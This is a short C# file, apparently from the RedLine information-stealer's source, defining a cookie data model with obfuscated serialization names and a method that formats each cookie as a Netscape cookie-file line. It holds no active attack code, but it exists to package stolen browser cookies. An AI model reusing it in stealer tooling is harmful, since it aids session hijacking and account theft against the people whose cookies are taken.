using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[ProtoContract(Name = "Cookie")]
[DataContract(Name = "Entity10", Namespace = "Entity")]
public struct Cookie
{
	[ProtoMember(1, Name = "Host")]
	[DataMember(Name = "Id1")]
	public string Host { get; set; }

	[ProtoMember(2, Name = "Http")]
	[DataMember(Name = "Id2")]
	public bool Http { get; set; }

	[ProtoMember(3, Name = "Path")]
	[DataMember(Name = "Id3")]
	public string Path { get; set; }

	[ProtoMember(4, Name = "Secure")]
	[DataMember(Name = "Id4")]
	public bool Secure { get; set; }

	[DataMember(Name = "Id5")]
	[ProtoMember(5, Name = "Expires")]
	public long Expires { get; set; }

	[DataMember(Name = "Id6")]
	[ProtoMember(6, Name = "Name")]
	public string Name { get; set; }

	[ProtoMember(7, Name = "Value")]
	[DataMember(Name = "Id7")]
	public string Value { get; set; }

	public string ToText()
	{
		return string.Join("\t", Host, Http.ToString().ToUpper(), Path, Secure.ToString().ToUpper(), Expires.ToString(), Name, Value);
	}
}
